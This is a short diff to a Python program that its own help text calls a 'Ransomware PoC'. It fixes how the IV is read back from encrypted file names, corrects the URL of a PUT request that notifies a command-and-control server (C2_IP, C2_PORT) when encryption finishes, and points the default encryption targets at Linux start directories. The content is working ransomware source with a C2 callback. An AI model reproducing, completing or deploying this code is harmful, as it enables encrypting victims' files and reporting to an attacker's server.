@@ -194,7 +194,7 @@ def select_encryption_algorithm(key):
 def select_decryption_algorithm(filename, key):
     split = path.basename(filename).split(".")[-2].split("--")
     flag = split[0]
-    extra = split[1] if len(split) > 1 else None
+    extra = "--".join(split[1:]) if len(split) > 1 else None
     if flag == "0":
         assert len(key) in [16, 24, 32]
         return AES.new(key=key, mode=AES.MODE_CBC, iv=b64decode(extra.replace("-#-", "/"))), "0"
@@ -313,7 +313,7 @@ def decrypt_files(key, start_dirs):
 
 
 def notify_rw_done():
-    put(url="{}:{}{}".format(C2_IP, C2_PORT, C2_RW_ROUTE), data="")
+    put(url="http://{}:{}{}".format(C2_IP, C2_PORT, C2_RW_ROUTE), data="")
 
 
 def run(encrypt, absolute_paths=None):
@@ -355,7 +355,7 @@ def parse_args():
     parser = ArgumentParser(description='Ransomware PoC')
     parser.add_argument('-p', '--path',
                         help='Comma-separated (no-whitespace) list of absolute paths to start encryption. '
-                             + 'If none specified, defaults to %%HOME%%/test_ransomware',
+                             + 'If none specified, defaults to {}'.format(LINUX_STARTDIRS),
                         action="store")
 
     group = parser.add_mutually_exclusive_group(required=True)
